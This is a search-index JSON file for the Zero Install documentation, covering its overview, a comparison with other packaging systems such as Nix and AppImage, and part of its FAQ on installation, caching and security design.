{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Zero Install Zero Install is a decentralised cross-platform software installation system available under the LGPL. It allows software developers to publish programs directly from their own web-sites, while supporting features familiar from centralised distribution repositories such as shared libraries, automatic updates and digital signatures. It is intended to complement, rather than replace, the operating system's package management. 0install packages never interfere with those provided by the distribution. 0install does not define a new packaging format; unmodified tarballs or zip archives can be used. Instead, it defines an XML metadata format to describe these packages and the dependencies between them. A single metadata file can be used on multiple platforms (e.g. Ubuntu, Debian, Fedora, openSUSE, Mac OS X and Windows), assuming binary or source archives are available that work on those systems. 0install also has some interesting features not often found in traditional package managers. For example, while it will share libraries whenever possible, it can always install multiple versions of a package in parallel when there are conflicting requirements. Installation is always side-effect-free (each package is unpacked to its own directory and will not touch shared directories such as /usr/bin), making it ideal for use with sandboxing technologies and virtualisation. The XML file describing the program's requirements can also be included in a source-code repository, allowing full dependency handling for unreleased developer versions. For example, a user can clone a Git repository and build and test the program, automatically downloading newer versions of libraries where necessary, without interfering with the versions of those libraries installed by their distribution, which continue to be used for other software. Started in 2003, 0install is developed by volunteers from around the world; contributors include Aleksey Lim, Anders F Bj\u00f6rklund, Bastian Eicher, Chris Leick, Daniel Tschan, Dave Abrahams, Frank Richter, Mark Seaborn, Michel Alexandre Salim, Pino Toscano, Rene Lopez, Thomas Leonard, Tim Cuthbertson and Tim Diels. More than one thousand packages are currently available and you can easily publish your own programs. Zero Install itself is available from the official repositories of most Linux distributions (including Arch, Debian, Fedora, Gentoo, Mint, openSUSE and Ubuntu). Get Zero Install now Why? Click one of the links below to find out why you may want to use 0install. By perspective How 0install benefits users, administrators, developers and distributions. Compared to other systems Why you may prefer 0install over another project. Cool features Some key features: native packager integration, sharing and security. FAQ Frequently Asked Questions More documentation Basics How to use 0install to download and run programs. Details How 0install works. Developers How to contribute to 0install itself, or integrate it with your own software. Packagers How to make software available through 0install. Specifications Formal specifications for the file formats used by 0install. Tools Programs to make publishing and using 0install programs easier.","title":"About"},{"location":"#zero-install","text":"Zero Install is a decentralised cross-platform software installation system available under the LGPL. It allows software developers to publish programs directly from their own web-sites, while supporting features familiar from centralised distribution repositories such as shared libraries, automatic updates and digital signatures. It is intended to complement, rather than replace, the operating system's package management. 0install packages never interfere with those provided by the distribution. 0install does not define a new packaging format; unmodified tarballs or zip archives can be used. Instead, it defines an XML metadata format to describe these packages and the dependencies between them. A single metadata file can be used on multiple platforms (e.g. Ubuntu, Debian, Fedora, openSUSE, Mac OS X and Windows), assuming binary or source archives are available that work on those systems. 0install also has some interesting features not often found in traditional package managers. For example, while it will share libraries whenever possible, it can always install multiple versions of a package in parallel when there are conflicting requirements. Installation is always side-effect-free (each package is unpacked to its own directory and will not touch shared directories such as /usr/bin), making it ideal for use with sandboxing technologies and virtualisation. The XML file describing the program's requirements can also be included in a source-code repository, allowing full dependency handling for unreleased developer versions. For example, a user can clone a Git repository and build and test the program, automatically downloading newer versions of libraries where necessary, without interfering with the versions of those libraries installed by their distribution, which continue to be used for other software. Started in 2003, 0install is developed by volunteers from around the world; contributors include Aleksey Lim, Anders F Bj\u00f6rklund, Bastian Eicher, Chris Leick, Daniel Tschan, Dave Abrahams, Frank Richter, Mark Seaborn, Michel Alexandre Salim, Pino Toscano, Rene Lopez, Thomas Leonard, Tim Cuthbertson and Tim Diels. More than one thousand packages are currently available and you can easily publish your own programs. Zero Install itself is available from the official repositories of most Linux distributions (including Arch, Debian, Fedora, Gentoo, Mint, openSUSE and Ubuntu). Get Zero Install now","title":"Zero Install"},{"location":"#why","text":"Click one of the links below to find out why you may want to use 0install. By perspective How 0install benefits users, administrators, developers and distributions. Compared to other systems Why you may prefer 0install over another project. Cool features Some key features: native packager integration, sharing and security. FAQ Frequently Asked Questions","title":"Why?"},{"location":"#more-documentation","text":"Basics How to use 0install to download and run programs. Details How 0install works. Developers How to contribute to 0install itself, or integrate it with your own software. Packagers How to make software available through 0install. Specifications Formal specifications for the file formats used by 0install. Tools Programs to make publishing and using 0install programs easier.","title":"More documentation"},{"location":"comparison/","text":"Matrix Explanation of features By project AppImage Chocolatey PortableApps.com Java Web Start Maven Autopackage / Listaller EDOS / Mancoosi Nix OSTree Glick 2 DOAPDescription of a Project Environment modules Matrix This matrix shows some desirable features in a packaging system, and shows which systems provide them. Obviously, these things tend to be a bit biased (both in terms of what features are chosen for comparison, and of what is considered to be a 'pass') but it should give the general idea. Feature Source tarball APT AppImage Chocolatey PortableApps.com Zero Install Users can install software Yes No Yes Some packages Yes Yes Supports multiple platforms Yes No (Linux only) No (Linux only) No (Windows only) No (Windows only) Yes Dependencies handled automatically No Yes Bundled Yes Bundled Yes Automatic upgrading No Yes Some packages No Yes Yes Libraries shared between programs Yes Yes No Partial No Yes Downloads shared between users No No user downloads No No No Yes Multiple versions coexist Yes No Yes No Yes Yes Uninstall Sometimes Yes Yes Some packages Yes Yes (cache) Digital signatures No Yes Yes Yes No Yes Conflict-free No No Yes No Yes Yes Decentralised Yes No Yes No No Yes Non-root install of system Yes No Yes No Yes Yes Can install systems software Yes Yes No Yes No No Supports sandboxing No No Yes No No Yes Usable when off-line Yes Yes Yes Yes Yes Yes Roam applications across machines No No Manual, app+config No Manual, app+config, manual Automatic, app only (Windows only) Thousands of packages available Yes Yes No Yes No No (~1500) Explanation of features Users can install software A normal user without special privileges can install software using this system (without unreasonable extra effort). Supports multiple platforms The same package format and command-line works across multiple operating systems, such as Linux and Windows. Dependencies handled automatically If a program requires some library to function, the system will locate, download and install the library too. Automatic upgrading The system can check for and install upgrades automatically or at the operator's request. User does not have to perform a full install operation manually on each package. Libraries shared between programs If two programs use the same library, the library is only downloaded and stored once. Upgrading a library will benefit all programs that use it. Downloads shared between users If two users install/use the same program, it is only downloaded once and stored once. See Sharing for how to set this up with Zero Install. Multiple versions coexist Two versions of a program or library can be installed at the same time, and the user can choose which one to run. Uninstall Programs can be cleanly removed from the system easily (reversing the effects of the install). Signatures Software comes with a digital signature, which is checked automatically by the system. Conflict-free If program A requires an old version of a library, and program B requires a new version, A and B can both be installed and used at the same time. The system will never refuse to install one program because some other program is installed. Decentralised A program packaged for this system can be installed easily, without having to be in some special centralised repository. Notes: Debian allows extra repositories to be added, but this is a manual step, requires root access, and is a considerable security risk. Non-root install of system The packaging system itself can be easily installed without administrator privileges, and the normal selection of software will be available. Can install systems software The packaging system can be used to install low-level systems software such as device drivers. Supports sandboxing If you have a way of running an application in a sandboxed environment (e.g., a Java virtual machine), then the installation system will let you install and run the program without forcing you to run any of the downloaded code outside of the sandbox. See the EBox sandboxing demo for an example of using 0install in this way. Usable when off-line Once a program has been installed, the program can be run again while disconnected. Roam applications between machines The packaging system makes it easy to roam applications across machines. This may or may not include the application's configuration files. This may or may not require manual effort by the user, such as setting up an external service like Dropbox. Thousands of packages available The system is widely adopted. By project AppImage AppImage is a system for packaging Linux applications into self-contained, single-file executables. Some differences between this and Zero Install: All dependencies are bundled into a single file and can therefore not be shared between apps. Automatic updating is implemented by an additional tool and only supported for some packages. However, unlike Zero Install, it supports delta updates. Only supports Linux. For projects that do not provide official cross-distribution builds, AppImages are actually good candidates for being published via Zero Install. They can easily be referenced using the <file> retrieval method with executable='true' . Chocolatey Chocolatey is a package manager for Windows. Some differences between this and Zero Install: Relies on packages to implement reliable install and uninstall logic themselves. Cannot guarantee conflict-free or side-by-side installation. Uses a central, moderated package repository rather than decentralized files on the web. Most packages require administrative permissions for installation. Only supports Windows. Chocolatey could in future serve the role of the native package manager on Windows. See details/distribution-integration.md PortableApps.com PortableApps.com is a collection of portable applications for Windows. Some differences between this and Zero Install: All dependencies are bundled and can therefore not be shared between apps. Only supports Windows. PortableApps write their config in the same directory as the installed applications. This makes them inherently incompatible with Zero Install, since it requires (and enforces) cached implementations to be read-only. Java Web Start Sun have developed a similar system to Zero Install, Java Web Start, although this only works for Java applications and has been deprecated. Microsoft have an equivalent called ClickOnce . Maven Maven is a build tool (like make or ant) for Java programs. Although not an installation system, it is similar to 0install in that each product has a pom.xml file with a list of dependencies. When building a product, Maven downloads the specified version of each dependency and stores it in a cache directory. Some differences between Maven 2.0 and 0install: The pom.xml files are not signed. An attacker can therefore cause modified POM files to be downloaded. There is no digest of the downloads in the POM file, so no security checks are performed to confirm that the download is OK, and downloads cannot be shared safely between users. Only Java is supported (everything is added to CLASSPATH , nowhere else). Dependencies are named using a simple two-layer system (e.g., axis/axis-jaxrpc). Therefore, a central repository is required to avoid naming conflicts. Note that you can use Zero Install in a maven-like way for compiling programs. See Easy GTK binary compatibility for an example of using Zero Install to compile a C program against an older version of a library's header files to ensure greater compatibility. Autopackage / Listaller Like Zero Install, Autopackage aims to let users install software and to make software distribution decentralised. The work done by the Autopackage developers to make packages relocatable is necessary for Zero Install too. Some differences between this and Zero Install: A script inside each package installs the files, making sandboxing difficult. It also makes conversion to other packaging formats troublesome . Security features such as GPG signatures have not been implemented. Given that packages are executable files, the design doesn't seem to allow this to be fixed. Downloads cannot be safely shared between users. No checking for updates or support for multiple versions. Being closer to traditional installation, it's easier to package existing applications with Autopackage. Note that it is quite possible to list autopackages in a Zero Install feed, as described in this post on the Autopackage mailing list . In this case, no scripts are run during installation (the package is treated as a normal archive), so not all packages will work, but many do. Autopackage is no longer maintained, but has merged with the Listaller project . The Listaller project has also taken over the tools for making relocatable applications , which may be useful for making 0install packages too. EDOS / Mancoosi The EDOS] ( Environment for the development and Distribution of Open Source software ) project was a research project looking at dependency management, QA, and efficient distribution of large software systems. Mancoosi is a follow-on project (\"Managing the Complexity of the Open Source Infrastructure\"). The group invited me to give a talk (March 2009); here are my notes from the event. Nix Nix is a purely functional package manager. Each version of a package has its own directory. As with Zero Install, \"upgrading\" creates a new directory for the new version, rather than modifying the existing one. Unlike Zero Install, however, whether a package is installed affects the behaviour of the system. For example, running \"firefox\" when Firefox isn't installed produces an error in Nix, whereas in Zero Install it will install Firefox first if missing and then continue. In other words, installation has side-effects in Nix. Additional feeds (e.g. for pre-built binaries) can be registered using nix-channel --add , which appears to work much like 0launch --feed , although each channel can contain binaries for multiple packages. The channel MANIFEST file doesn't appear to have a digital signature. Presumably this will be added at some point. Each version of a package has a digest (hash), which includes all build dependencies (e.g. the version of the compiler used), just as it does in Zero Install (for packages built using 0compile, at least). An important difference between the two is that the Nix hash is a hash of the inputs used to build the package, whereas the Zero Install hash is a hash of the resulting binary . Nix does this to support binaries that hard code their own paths, since the final hash needs to be known at compile time. For source (non-compiled) packages, the Nix hash is a hash of the contents, as with Zero Install. The Zero Install hash often happens to include the inputs, since it covers the build-environment.xml file which 0compile places in each binary package. Zero Install doesn't allow binaries to include hard-coded paths. Update: Nix is planning to use binary hashes everywhere in future (zeroing out self-references for the purposes of calculating the hashes). The same thing was proposed a few years ago for Zero Install (the relocation table ). It relies on the cache directory being at a fixed location, whereas people often have Zero Install set up to use their home directory, but it's basically a good idea. Another difference between Nix and Zero Install is that Nix treats configurations as packages. Changing your configuration is like \"upgrading\" your configuration package to a new version. Rolling back a change is like reverting to a previous version. Zero Install doesn't generally handle configuration settings, preferring to let the user use subversion (or similar) for that, but it's an interesting idea. Building a Nix package involves creating a \"Nix expression\" in a (custom) functional language. The expression fills the same role as a Zero Install source feedit says where to download the source, what its digest is, what the build dependencies are, and how to build it. While Zero Install is mainly targeted at adding additional packages to an existing system, Nix aims to manage the whole system (although it installs cleanly alongside your existing package manager). Nix packages have short names (like perl ) not full URIs, and thus it appears to assume a centrally-controlled repository. In Nix, mutually untrusting users cannot share packages. The manual says A setuid installation should only by used if the users in the Nix group are mutually trusted, since any user in that group has the ability to change anything in the Nix store. Because the Nix hash is a hash of the inputs, it is not possible for the system to verify that a package is valid (it would have to download the sources and compile the program itself; Nix can share binaries in this case). Because Zero Install hashes are always hashes of the package contents, it does support sharing . OSTree OSTree describes itself as \"git for operating system binaries\". It shares many goals with 0install (multiple versions of libraries can coexist on one system and you can roll-back easily). While 0install focuses on applications and their libraries, OSTree focuses on the OS itself. However, there is quite a bit of overlap. For example, OSTree considers GTK+ to be an OS library, while 0install might consider it to be an application dependency (which can optionally, of course, be provided by the OS). Glick 2 Glick 2 has essentially the same goals as 0install, but includes all dependencies in a single bundle rather than linking libraries dynamically at run-time (for example, when a library is updated, every program using that library must be updated individually). It has support for non-relocatable applications, using some Linux-specific tricks. It might be worth using these in 0install to implement the <mount-point> binding, but few applications are non-relocatable these days. DOAPDescription of a Project DOAP is a project to create an XML/RDF vocabulary to describe open source projects. We should investigate whether any of these elements would be useful in Zero Install feed files. Environment modules The Environment Modules package provides for the dynamic modification of a user's environment via modulefiles. Each modulefile contains the information needed to configure the shell for an application. Typically modulefiles instruct the module command to alter or set shell environment variables such as PATH , MANPATH , etc. To be able to load (\"install\") software, it must first be installed under the $MODULESHOME directory which is in /usr/local/Modules or a shared network filesystem. It is also possible to install it in ~/.local without root permissions, but then the modules can't be shared (due to different $HOME ). The module(1) command doesn't provide a method to share or distribute the applications, so modulefiles typically take advantage of transparent remote network filesystem access such as NFS and AFS. 0install can also be used in this way, with local feeds taking the place of the modulefiles and giving the path of the software on the network file-system rather than a URL from which it can be downloaded. If you believe that any of the information above is inaccurate or out-of-date, please write to mailing list to let us know. Thanks!","title":"Comparison"},{"location":"comparison/#matrix","text":"This matrix shows some desirable features in a packaging system, and shows which systems provide them. Obviously, these things tend to be a bit biased (both in terms of what features are chosen for comparison, and of what is considered to be a 'pass') but it should give the general idea. Feature Source tarball APT AppImage Chocolatey PortableApps.com Zero Install Users can install software Yes No Yes Some packages Yes Yes Supports multiple platforms Yes No (Linux only) No (Linux only) No (Windows only) No (Windows only) Yes Dependencies handled automatically No Yes Bundled Yes Bundled Yes Automatic upgrading No Yes Some packages No Yes Yes Libraries shared between programs Yes Yes No Partial No Yes Downloads shared between users No No user downloads No No No Yes Multiple versions coexist Yes No Yes No Yes Yes Uninstall Sometimes Yes Yes Some packages Yes Yes (cache) Digital signatures No Yes Yes Yes No Yes Conflict-free No No Yes No Yes Yes Decentralised Yes No Yes No No Yes Non-root install of system Yes No Yes No Yes Yes Can install systems software Yes Yes No Yes No No Supports sandboxing No No Yes No No Yes Usable when off-line Yes Yes Yes Yes Yes Yes Roam applications across machines No No Manual, app+config No Manual, app+config, manual Automatic, app only (Windows only) Thousands of packages available Yes Yes No Yes No No (~1500)","title":"Matrix"},{"location":"comparison/#explanation-of-features","text":"Users can install software A normal user without special privileges can install software using this system (without unreasonable extra effort). Supports multiple platforms The same package format and command-line works across multiple operating systems, such as Linux and Windows. Dependencies handled automatically If a program requires some library to function, the system will locate, download and install the library too. Automatic upgrading The system can check for and install upgrades automatically or at the operator's request. User does not have to perform a full install operation manually on each package. Libraries shared between programs If two programs use the same library, the library is only downloaded and stored once. Upgrading a library will benefit all programs that use it. Downloads shared between users If two users install/use the same program, it is only downloaded once and stored once. See Sharing for how to set this up with Zero Install. Multiple versions coexist Two versions of a program or library can be installed at the same time, and the user can choose which one to run. Uninstall Programs can be cleanly removed from the system easily (reversing the effects of the install). Signatures Software comes with a digital signature, which is checked automatically by the system. Conflict-free If program A requires an old version of a library, and program B requires a new version, A and B can both be installed and used at the same time. The system will never refuse to install one program because some other program is installed. Decentralised A program packaged for this system can be installed easily, without having to be in some special centralised repository. Notes: Debian allows extra repositories to be added, but this is a manual step, requires root access, and is a considerable security risk. Non-root install of system The packaging system itself can be easily installed without administrator privileges, and the normal selection of software will be available. Can install systems software The packaging system can be used to install low-level systems software such as device drivers. Supports sandboxing If you have a way of running an application in a sandboxed environment (e.g., a Java virtual machine), then the installation system will let you install and run the program without forcing you to run any of the downloaded code outside of the sandbox. See the EBox sandboxing demo for an example of using 0install in this way. Usable when off-line Once a program has been installed, the program can be run again while disconnected. Roam applications between machines The packaging system makes it easy to roam applications across machines. This may or may not include the application's configuration files. This may or may not require manual effort by the user, such as setting up an external service like Dropbox. Thousands of packages available The system is widely adopted.","title":"Explanation of features"},{"location":"comparison/#by-project","text":"","title":"By project"},{"location":"comparison/#appimage","text":"AppImage is a system for packaging Linux applications into self-contained, single-file executables. Some differences between this and Zero Install: All dependencies are bundled into a single file and can therefore not be shared between apps. Automatic updating is implemented by an additional tool and only supported for some packages. However, unlike Zero Install, it supports delta updates. Only supports Linux. For projects that do not provide official cross-distribution builds, AppImages are actually good candidates for being published via Zero Install. They can easily be referenced using the <file> retrieval method with executable='true' .","title":"AppImage"},{"location":"comparison/#chocolatey","text":"Chocolatey is a package manager for Windows. Some differences between this and Zero Install: Relies on packages to implement reliable install and uninstall logic themselves. Cannot guarantee conflict-free or side-by-side installation. Uses a central, moderated package repository rather than decentralized files on the web. Most packages require administrative permissions for installation. Only supports Windows. Chocolatey could in future serve the role of the native package manager on Windows. See details/distribution-integration.md","title":"Chocolatey"},{"location":"comparison/#portableappscom","text":"PortableApps.com is a collection of portable applications for Windows. Some differences between this and Zero Install: All dependencies are bundled and can therefore not be shared between apps. Only supports Windows. PortableApps write their config in the same directory as the installed applications. This makes them inherently incompatible with Zero Install, since it requires (and enforces) cached implementations to be read-only.","title":"PortableApps.com"},{"location":"comparison/#java-web-start","text":"Sun have developed a similar system to Zero Install, Java Web Start, although this only works for Java applications and has been deprecated. Microsoft have an equivalent called ClickOnce .","title":"Java Web Start"},{"location":"comparison/#maven","text":"Maven is a build tool (like make or ant) for Java programs. Although not an installation system, it is similar to 0install in that each product has a pom.xml file with a list of dependencies. When building a product, Maven downloads the specified version of each dependency and stores it in a cache directory. Some differences between Maven 2.0 and 0install: The pom.xml files are not signed. An attacker can therefore cause modified POM files to be downloaded. There is no digest of the downloads in the POM file, so no security checks are performed to confirm that the download is OK, and downloads cannot be shared safely between users. Only Java is supported (everything is added to CLASSPATH , nowhere else). Dependencies are named using a simple two-layer system (e.g., axis/axis-jaxrpc). Therefore, a central repository is required to avoid naming conflicts. Note that you can use Zero Install in a maven-like way for compiling programs. See Easy GTK binary compatibility for an example of using Zero Install to compile a C program against an older version of a library's header files to ensure greater compatibility.","title":"Maven"},{"location":"comparison/#autopackage-listaller","text":"Like Zero Install, Autopackage aims to let users install software and to make software distribution decentralised. The work done by the Autopackage developers to make packages relocatable is necessary for Zero Install too. Some differences between this and Zero Install: A script inside each package installs the files, making sandboxing difficult. It also makes conversion to other packaging formats troublesome . Security features such as GPG signatures have not been implemented. Given that packages are executable files, the design doesn't seem to allow this to be fixed. Downloads cannot be safely shared between users. No checking for updates or support for multiple versions. Being closer to traditional installation, it's easier to package existing applications with Autopackage. Note that it is quite possible to list autopackages in a Zero Install feed, as described in this post on the Autopackage mailing list . In this case, no scripts are run during installation (the package is treated as a normal archive), so not all packages will work, but many do. Autopackage is no longer maintained, but has merged with the Listaller project . The Listaller project has also taken over the tools for making relocatable applications , which may be useful for making 0install packages too.","title":"Autopackage / Listaller"},{"location":"comparison/#edos-mancoosi","text":"The EDOS] ( Environment for the development and Distribution of Open Source software ) project was a research project looking at dependency management, QA, and efficient distribution of large software systems. Mancoosi is a follow-on project (\"Managing the Complexity of the Open Source Infrastructure\"). The group invited me to give a talk (March 2009); here are my notes from the event.","title":"EDOS / Mancoosi"},{"location":"comparison/#nix","text":"Nix is a purely functional package manager. Each version of a package has its own directory. As with Zero Install, \"upgrading\" creates a new directory for the new version, rather than modifying the existing one. Unlike Zero Install, however, whether a package is installed affects the behaviour of the system. For example, running \"firefox\" when Firefox isn't installed produces an error in Nix, whereas in Zero Install it will install Firefox first if missing and then continue. In other words, installation has side-effects in Nix. Additional feeds (e.g. for pre-built binaries) can be registered using nix-channel --add , which appears to work much like 0launch --feed , although each channel can contain binaries for multiple packages. The channel MANIFEST file doesn't appear to have a digital signature. Presumably this will be added at some point. Each version of a package has a digest (hash), which includes all build dependencies (e.g. the version of the compiler used), just as it does in Zero Install (for packages built using 0compile, at least). An important difference between the two is that the Nix hash is a hash of the inputs used to build the package, whereas the Zero Install hash is a hash of the resulting binary . Nix does this to support binaries that hard code their own paths, since the final hash needs to be known at compile time. For source (non-compiled) packages, the Nix hash is a hash of the contents, as with Zero Install. The Zero Install hash often happens to include the inputs, since it covers the build-environment.xml file which 0compile places in each binary package. Zero Install doesn't allow binaries to include hard-coded paths. Update: Nix is planning to use binary hashes everywhere in future (zeroing out self-references for the purposes of calculating the hashes). The same thing was proposed a few years ago for Zero Install (the relocation table ). It relies on the cache directory being at a fixed location, whereas people often have Zero Install set up to use their home directory, but it's basically a good idea. Another difference between Nix and Zero Install is that Nix treats configurations as packages. Changing your configuration is like \"upgrading\" your configuration package to a new version. Rolling back a change is like reverting to a previous version. Zero Install doesn't generally handle configuration settings, preferring to let the user use subversion (or similar) for that, but it's an interesting idea. Building a Nix package involves creating a \"Nix expression\" in a (custom) functional language. The expression fills the same role as a Zero Install source feedit says where to download the source, what its digest is, what the build dependencies are, and how to build it. While Zero Install is mainly targeted at adding additional packages to an existing system, Nix aims to manage the whole system (although it installs cleanly alongside your existing package manager). Nix packages have short names (like perl ) not full URIs, and thus it appears to assume a centrally-controlled repository. In Nix, mutually untrusting users cannot share packages. The manual says A setuid installation should only by used if the users in the Nix group are mutually trusted, since any user in that group has the ability to change anything in the Nix store. Because the Nix hash is a hash of the inputs, it is not possible for the system to verify that a package is valid (it would have to download the sources and compile the program itself; Nix can share binaries in this case). Because Zero Install hashes are always hashes of the package contents, it does support sharing .","title":"Nix"},{"location":"comparison/#ostree","text":"OSTree describes itself as \"git for operating system binaries\". It shares many goals with 0install (multiple versions of libraries can coexist on one system and you can roll-back easily). While 0install focuses on applications and their libraries, OSTree focuses on the OS itself. However, there is quite a bit of overlap. For example, OSTree considers GTK+ to be an OS library, while 0install might consider it to be an application dependency (which can optionally, of course, be provided by the OS).","title":"OSTree"},{"location":"comparison/#glick-2","text":"Glick 2 has essentially the same goals as 0install, but includes all dependencies in a single bundle rather than linking libraries dynamically at run-time (for example, when a library is updated, every program using that library must be updated individually). It has support for non-relocatable applications, using some Linux-specific tricks. It might be worth using these in 0install to implement the <mount-point> binding, but few applications are non-relocatable these days.","title":"Glick 2"},{"location":"comparison/#doapdescription-of-a-project","text":"DOAP is a project to create an XML/RDF vocabulary to describe open source projects. We should investigate whether any of these elements would be useful in Zero Install feed files.","title":"DOAPDescription of a Project"},{"location":"comparison/#environment-modules","text":"The Environment Modules package provides for the dynamic modification of a user's environment via modulefiles. Each modulefile contains the information needed to configure the shell for an application. Typically modulefiles instruct the module command to alter or set shell environment variables such as PATH , MANPATH , etc. To be able to load (\"install\") software, it must first be installed under the $MODULESHOME directory which is in /usr/local/Modules or a shared network filesystem. It is also possible to install it in ~/.local without root permissions, but then the modules can't be shared (due to different $HOME ). The module(1) command doesn't provide a method to share or distribute the applications, so modulefiles typically take advantage of transparent remote network filesystem access such as NFS and AFS. 0install can also be used in this way, with local feeds taking the place of the modulefiles and giving the path of the software on the network file-system rather than a URL from which it can be downloaded. If you believe that any of the information above is inaccurate or out-of-date, please write to mailing list to let us know. Thanks!","title":"Environment modules"},{"location":"faq/","text":"Frequently asked questions: General questions Network questions Security questions Developers General questions What is it? Zero Install is a way to run software without an explicit installation step. This is easier ( install and run becomes just run ) and safer (installation doesn't happen as root). How many Zero Install packages are there? The public mirror site provides a list of feeds we know about. There are currently more than 500, although the quality varies. What are \"decentralised\" installation systems, and why are they important? See my essay on OSNews or, if you're in a hurry, just read the summary . Where does it install things to? By default, everything goes under ~/.cache/0install.net/ . If you enable system-wide sharing , then things go under /var/cache/0install.net/ instead. See File locations . If you want to know where a particular program is, you can use 0install show , e.g. $ 0install add rox-edit http://rox.sourceforge.net/2005/interfaces/Edit $ 0install show rox-edit - URI: http://rox.sourceforge.net/2005/interfaces/Edit Version: 2.2 Path: /home/me/.cache/0install.net/implementations/sha256=ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9 - URI: http://rox.sourceforge.net/2005/interfaces/ROX-Lib Version: 2.0.6 Path: /home/me/.cache/0install.net/implementations/sha256=ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e - URI: http://repo.roscidus.com/python/python Version: 2.7.8-3 Path: (package:deb:python2.7:2.7.8-3:x86_64) That said, you shouldn't ever need to know where things are cached. If you're relying on this for some reason, you're probably doing it wrong ;-) Isn't is really hard to run applications if you always have to type URIs for them? Yes. As with the web, that works but it's not the intended way to do it. Like the web, you have links to the URIs, and you use the links normally. For example, you can run 0install add to let you run programs quickly from the shell, or AddApp to create graphical launchers, for example. You could put a launcher on the desktop background, set a keyboard shortcut, or add it to your Start menu. A 'distribution' could be nothing more than a web page listing links to high quality software for a particular audience. How do you do integration (e.g., making a Start menu show all installed software)? Since there is no concept of software being 'installed' or 'not-installed', this is not required. The menu (or other launching device) simply shows applications that the user may want to run. They will be fetched on demand. The menu doesn't show installed software; rather, the 'installed' software is what the user has put on the menu. This can be done e.g. using the 0desktop command on Linux or the desktop integration feature on Windows. The new menu entry is independent of the program data though; removing the program from the cache doesn't remove the menu item (clicking on it would simply offer to download the program again). Isn't it wasteful for every program to bundle all its dependencies? Yes, but Zero Install doesn't do that. Everything is dynamically linked, just as in a traditional Linux system: you can publish a program on your web-site that links against a library on another web-site. When updates are available for a library, they are used by all programs using that library (except for programs which are incompatible with the new library version, which will continue using the older version, without preventing other programs from upgrading). However, see Export for methods to create such all-in-one bundles for distribution on CD. Why was it called the \"injector\"? The name came from Dependency Injection - see \"The scarily-named Injector\" for details. Now we just call it \"0install\". Wouldn't it be cool if you could install software just by clicking in a web page? It's a bit of a security risk. If you set up your browser to do this, then the author of any random web-site can try to trick you into clicking on some harmless-looking link. They may even be able to trigger the process without any action from you at all. Zero Install's confirmation dialogs should prevent it from actually getting installed, but: Even with confirmation boxes, web pages can still annoy users by opening thousands of them. You'd need some kind of popup-blocker type technology to stop that. The malicious web page gets to send arbitrary data of their choice to Zero Install. For example, they might try to exploit a buffer-overflow in GnuPG by sending malformed data. Zero Install should reject it, but it's safer if we don't even allow the process to start. If you do this, then your browser needs permission to run arbitrary programs, add items to your Start menu, etc. Given that the browser is one of the most at-risk components on your system, this doesn't sound like a good plan (although browsers are often configured this way at present). Therefore, we require you to drag the link to the installer to start the process. That way, if you weren't intending to install anything, then the process doesn't even start. As an added bonus, this lets you specify where on your desktop you want the launcher created. That said, if you want this anyway then there's an experimental Firefox Extension to do this. Will Zero Install conflict with my existing package manager? No. Zero Install only writes to its own cache directory. It is completely independent of your existing packaging system. If you install the same program using both systems, you'll get two copies on your system, but they will be kept separate. You can use this to test a newer version of a program without messing up your existing installation. Zero Install can use distribution packages to satisfy some dependencies (rather than downloading a new copy itself). This doesn't affect programs installed using the native packaging system at all. See Distribution Integration for details. Note: while installation won't cause problems, actually running a program might change something (for example, a newer version may automatically upgrade a configuration file to a format that the older version can't read). This is essentially the same situation as when you downgrade a package to a previous version using your normal package manager. How do I know you won't start charging for this service? I'm not providing a service. You distribute software by hosting some files on your own web server. The only centralised URLs are the default mirror site and the default GPG key information server, both of which are optional. The core software is all LGPL or GPL. What if something gets automatically removed from the cache while I'm up a mountain with my laptop? Currently, nothing is ever automatically removed from the cache. Users can choose the purging scheme that suits them. For users with broadband, that might mean removing anything that hasn't been accessed for a year. For users with dial-up and 80Gb disks, that probably means never ever removing anything. You can click on the Cache button to view the cache and remove versions of programs you don't need anymore: You can also just delete things from the ~/.cache/0install.net directory directly, but it's easier using the GUI. What happens if there are two programs which may not be run simultaneously for some reason? Running and installing are separate. In Debian, for example, installing some software (eg, exim) may also cause it to run, but in zero install there is no install step, only the running step. So, you can 'install' any number of conflicting packages, but you can still only run one mail system at once. Can upstream authors really be trusted to provide decent quality software? Traditionally, a lot of the QA work that goes on in open source software is done by distributions (such as Debian). They take the `upstream' code from the software authors, and then provide a packaged version to their users. There are then two classes of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear to users which bugs are in which category, they tend to report all bugs to the packagers, who often then fix even upstream bugs in their own packages. The effect of this is that distribution-provided packages are often more reliable than upstream ones (since upstream don't get to hear about many of the bugs), and different distributions have fixed different bugs, with no coordination between them. With Zero Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes would benefit everyone, not just Debian users. Of course, the other reason why packages may be different to the upstream versions is because upstream is slow to respond, uninterested, or known to be careless about quality. In this case, a Zero Install packager can provide a fixed version from their own site and get other people to link to that. The advantage here is that, again, everyone benefits, not just users of one distribution. Does this replace /etc , /var , /tmp , etc? No. Zero Install is read-only, so you couldn't store configuration, data or temporary files in it, even if you wanted to. It replaces /usr and /opt . It's sensible to keep the other things separate, because they need to be treated differently: /etc : Contains system configuration. Should be backed up, and probably kept under version control too. May be mounted read-only most of the time. /home : User data. Must be writable, and often changes. Should be backed up regularly. /var : Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't need to be backed up, but data should persist over reboots. Zero Install cache is stored here; if lost it will just prompt you to download the programs again when you run them. /tmp : Changes quickly and must be writable, but need not persist over reboots (can use tmpfs rather than a physical disk). What was the inspiration for Zero Install? Several things. CODA and wwwoffle for showing that caching network filesystems can still work when off-line. The W3C for using URIs for namespaces. Not Java Web Start , Konvalo, D. J. Bernstein's slashpackage or The Open Software Description Format (OSD) though, because I had never heard of them when I started the project. What's the relationship between the 0install and 0launch commands? 0launch is older. It was originally intended to be used just for running things, but we ended up adding a load of other options to it (e.g. 0launch --import ) and it got a bit messy. 0install provides a cleaner, newer interface using sub-commands. 0launch URI is equivalent to 0install run URI . In general, using 0launch as anything other than a short form of 0install run is deprecated and you should use 0install instead. Network questions Isn't fetching stuff over the web really slow? You have to get stuff over the web anyway the first time. The system caches everything, and you can run the software in future without needing a network connection. Doesn't it require a fast Internet connection? No more than downloading programs from the Internet normally. However, it can still save you some 